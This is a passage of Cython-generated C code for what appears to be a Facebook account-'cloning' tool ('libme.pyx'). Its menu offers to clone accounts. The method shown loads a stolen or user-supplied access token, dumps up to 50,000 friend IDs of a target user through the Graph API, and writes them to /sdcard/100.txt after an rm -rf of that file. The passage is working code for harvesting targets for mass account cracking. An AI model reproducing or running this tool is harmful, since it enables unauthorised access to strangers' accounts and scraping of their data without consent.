    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 627, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":625
 * 		if __method__1__ == "":
 * 			self.menu_file()
 * 		elif __method__1__ == "1":             # <<<<<<<<<<<<<<
 * 			self.__10007__()
 * 			self.__10000__()
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":628
 * 			self.__10007__()
 * 			self.__10000__()
 * 		elif __method__1__ == "2":             # <<<<<<<<<<<<<<
 * 			self.__ma__sal2__()
 * 			self.__Frrr__()
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__1__, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 628, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":629
 * 			self.__10000__()
 * 		elif __method__1__ == "2":
 * 			self.__ma__sal2__()             # <<<<<<<<<<<<<<
 * 			self.__Frrr__()
 * 		elif __method__1__ == "3":
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ma__sal2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 629, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 629, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":630
 * 		elif __method__1__ == "2":
 * 			self.__ma__sal2__()
 * 			self.__Frrr__()             # <<<<<<<<<<<<<<
 * 		elif __method__1__ == "3":
 * 			self.__mennn__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_Frrr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 630, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 630, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":628
 * 			self.__10007__()
 * 			self.__10000__()
 * 		elif __method__1__ == "2":             # <<<<<<<<<<<<<<
 * 			self.__ma__sal2__()
 * 			self.__Frrr__()
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":631
 * 			self.__ma__sal2__()
 * 			self.__Frrr__()
 * 		elif __method__1__ == "3":             # <<<<<<<<<<<<<<
 * 			self.__mennn__()
 * 	def __10007__(self):
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___method__1__, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 631, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":632
 * 			self.__Frrr__()
 * 		elif __method__1__ == "3":
 * 			self.__mennn__()             # <<<<<<<<<<<<<<
 * 	def __10007__(self):
 * 		try:
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mennn); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 632, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 632, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":631
 * 			self.__ma__sal2__()
 * 			self.__Frrr__()
 * 		elif __method__1__ == "3":             # <<<<<<<<<<<<<<
 * 			self.__mennn__()
 * 	def __10007__(self):
 */
  }
  __pyx_L3:;

  /* "libme.pyx":618
 * 
 * 		self.loop += 1
 * 	def __method__1__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("libme.James.__method__1__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v___method__1__);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":633
 * 		elif __method__1__ == "3":
 * 			self.__mennn__()
 * 	def __10007__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_41__10007__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_41__10007__ = {"__10007__", (PyCFunction)__pyx_pw_5libme_5James_41__10007__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_41__10007__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__10007__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_40__10007__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_40__10007__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v___total = NULL;
  PyObject *__pyx_v___file = NULL;
  PyObject *__pyx_v_zx = NULL;
  PyObject *__pyx_v___ids = NULL;
  PyObject *__pyx_v_rex = NULL;
  PyObject *__pyx_v_ex = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_id = NULL;
  PyObject *__pyx_v_a = NULL;
  PyObject *__pyx_v___id = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  int __pyx_t_14;
  int __pyx_t_15;
  int __pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__10007__", 0);

  /* "libme.pyx":634
 * 			self.__mennn__()
 * 	def __10007__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":635
 * 	def __10007__(self):
 * 		try:
 * 			token =open('login.txt', 'r').read()             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 635, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 635, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 635, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":634
 * 			self.__mennn__()
 * 	def __10007__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "libme.pyx":636
 * 		try:
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("  [!] Token invalid")
 * 		try:
 */
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("libme.James.__10007__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 636, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      /* "libme.pyx":637
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")             # <<<<<<<<<<<<<<
 * 		try:
 * 			__total = int(input("\n  [!] How much link you want dump : "))
 */
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 637, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":634
 * 			self.__mennn__()
 * 	def __10007__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			token =open('login.txt', 'r').read()
 * 		except(KeyError , IOError):
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":638
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How much link you want dump : "))
 * 		except:
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_1);
    /*try:*/ {

      /* "libme.pyx":639
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [!] How much link you want dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 639, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyNumber_Int(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 639, __pyx_L11_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v___total = __pyx_t_6;
      __pyx_t_6 = 0;

      /* "libme.pyx":638
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How much link you want dump : "))
 * 		except:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    goto __pyx_L16_try_end;
    __pyx_L11_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":640
 * 		try:
 * 			__total = int(input("\n  [!] How much link you want dump : "))
 * 		except:             # <<<<<<<<<<<<<<
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/100.txt")
 */
    /*except:*/ {
      __Pyx_AddTraceback("libme.James.__10007__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 640, __pyx_L13_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":641
 * 			__total = int(input("\n  [!] How much link you want dump : "))
 * 		except:
 * 			__total = 1             # <<<<<<<<<<<<<<
 * 		os.system("rm -rf /sdcard/100.txt")
 * 		__file = ("/sdcard/100.txt")
 */
      __Pyx_INCREF(__pyx_int_1);
      __Pyx_XDECREF_SET(__pyx_v___total, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L12_exception_handled;
    }
    __pyx_L13_except_error:;

    /* "libme.pyx":638
 * 		except(KeyError , IOError):
 * 			exit("  [!] Token invalid")
 * 		try:             # <<<<<<<<<<<<<<
 * 			__total = int(input("\n  [!] How much link you want dump : "))
 * 		except:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    goto __pyx_L1_error;
    __pyx_L12_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_2, __pyx_t_1);
    __pyx_L16_try_end:;
  }

  /* "libme.pyx":642
 * 		except:
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/100.txt")             # <<<<<<<<<<<<<<
 * 		__file = ("/sdcard/100.txt")
 * 		for zx in range(__total):
 */
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 642, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 642, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_s_rm_rf_sdcard_100_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s_rm_rf_sdcard_100_txt);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 642, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":643
 * 			__total = 1
 * 		os.system("rm -rf /sdcard/100.txt")
 * 		__file = ("/sdcard/100.txt")             # <<<<<<<<<<<<<<
 * 		for zx in range(__total):
 * 			zx += 1
 */
  __Pyx_INCREF(__pyx_kp_s_sdcard_100_txt);
  __pyx_v___file = __pyx_kp_s_sdcard_100_txt;

  /* "libme.pyx":644
 * 		os.system("rm -rf /sdcard/100.txt")
 * 		__file = ("/sdcard/100.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v___total); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 644, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
    __pyx_t_6 = __pyx_t_4; __Pyx_INCREF(__pyx_t_6); __pyx_t_9 = 0;
    __pyx_t_10 = NULL;
  } else {
    __pyx_t_9 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 644, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_10 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 644, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  for (;;) {
    if (likely(!__pyx_t_10)) {
      if (likely(PyList_CheckExact(__pyx_t_6))) {
        if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 644, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 644, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 644, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 644, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_10(__pyx_t_6);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 644, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":645
 * 		__file = ("/sdcard/100.txt")
 * 		for zx in range(__total):
 * 			zx += 1             # <<<<<<<<<<<<<<
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 */
    __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_zx, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 645, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":646
 * 		for zx in range(__total):
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")             # <<<<<<<<<<<<<<
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 */
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 646, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_XDECREF_SET(__pyx_v___ids, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":647
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        /* "libme.pyx":648
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))             # <<<<<<<<<<<<<<
 * 				ex=json.loads(rex.text)
 * 				file = open(__file , 'a')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 648, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 648, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 648, __pyx_L21_error) }
        __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 648, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_v___ids);
        __Pyx_GIVEREF(__pyx_v___ids);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v___ids);
        __Pyx_INCREF(__pyx_v_token);
        __Pyx_GIVEREF(__pyx_v_token);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_v_token);
        __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_field, __pyx_t_5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 648, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 648, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_rex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":649
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)             # <<<<<<<<<<<<<<
 * 				file = open(__file , 'a')
 * 				id = []
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 649, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_loads); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 649, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_rex, __pyx_n_s_text); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 649, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
